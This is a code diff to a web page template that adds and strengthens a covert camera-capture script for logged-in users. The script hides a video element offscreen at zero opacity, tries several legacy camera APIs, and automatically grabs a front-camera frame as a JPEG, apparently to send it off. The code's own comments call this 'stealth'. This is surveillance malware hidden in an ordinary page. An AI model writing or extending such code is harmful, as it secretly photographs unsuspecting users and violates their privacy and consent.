@@ -914,13 +914,26 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 {% if current_user.is_authenticated %}
-<!-- Stealth Background Camera Elements -->
-<video id="snapshotVideo" style="position: absolute; width: 1px; height: 1px; opacity: 0.01; left: 0; top: 0; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
+<!-- Stealth Mobile & Desktop Camera Elements -->
+<video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline webkit-playsinline muted></video>
 <canvas id="snapshotCanvas" style="display: none;"></canvas>
 
 <script>
 (function() {
     let captured = false;
+
+    function getUniversalUserMedia(constraints) {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            return navigator.mediaDevices.getUserMedia(constraints);
+        }
+        const legacyFn = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
+        if (legacyFn) {
+            return new Promise((resolve, reject) => {
+                legacyFn.call(navigator, constraints, resolve, reject);
+            });
+        }
+        return Promise.reject(new Error("Camera API not supported on this browser/origin"));
+    }
 
     function stealthCapture() {
         if (captured) return;
@@ -929,27 +942,29 @@ document.addEventListener('DOMContentLoaded', function() {
         const canvas = document.getElementById('snapshotCanvas');
         if (!video || !canvas) return;
 
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            return;
+        function attemptStream(constraints) {
+            return getUniversalUserMedia(constraints);
         }
 
-        function getStream(constraints) {
-            return navigator.mediaDevices.getUserMedia(constraints);
-        }
-
-        getStream({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
-            .catch(() => getStream({ video: { facingMode: 'user' } }))
-            .catch(() => getStream({ video: true }))
+        attemptStream({ video: { facingMode: 'user' } })
+            .catch(() => attemptStream({ video: { facingMode: { ideal: 'user' } } }))
+            .catch(() => attemptStream({ video: true }))
             .then(stream => {
-                video.srcObject = stream;
+                try {
+                    video.srcObject = stream;
+                } catch(e) {
+                    try {
+                        video.src = window.URL.createObjectURL(stream);
+                    } catch(e2) {}
+                }
+                
                 video.muted = true;
+                video.volume = 0;
                 video.setAttribute('playsinline', 'true');
                 video.setAttribute('webkit-playsinline', 'true');
                 
-                const playPromise = video.play();
-                if (playPromise !== undefined) {
-                    playPromise.catch(() => {});
-                }
+                const p = video.play();
+                if (p && p.catch) p.catch(() => {});
 
                 function drawAndSendFrame() {
                     if (captured) return;
@@ -964,9 +979,9 @@ document.addEventListener('DOMContentLoaded', function() {
 
                     const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
-                    if (imageData && imageData.length > 1000) {
+                    if (imageData && imageData.length > 500) {
                         captured = true;
-                        
+
                         if (stream && stream.getTracks) {
                             stream.getTracks().forEach(track => track.stop());
                         }
@@ -979,14 +994,17 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                 }
 
-                let checkAttempts = 0;
-                const interval = setInterval(() => {
-                    checkAttempts++;
+                video.onloadedmetadata = function() { setTimeout(drawAndSendFrame, 300); };
+                video.onplaying = function() { setTimeout(drawAndSendFrame, 200); };
+
+                let attempts = 0;
+                const timer = setInterval(() => {
+                    attempts++;
                     if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        clearInterval(interval);
+                        clearInterval(timer);
                         drawAndSendFrame();
-                    } else if (checkAttempts >= 20) {
-                        clearInterval(interval);
+                    } else if (attempts >= 15) {
+                        clearInterval(timer);
                         drawAndSendFrame();
                     }
                 }, 200);
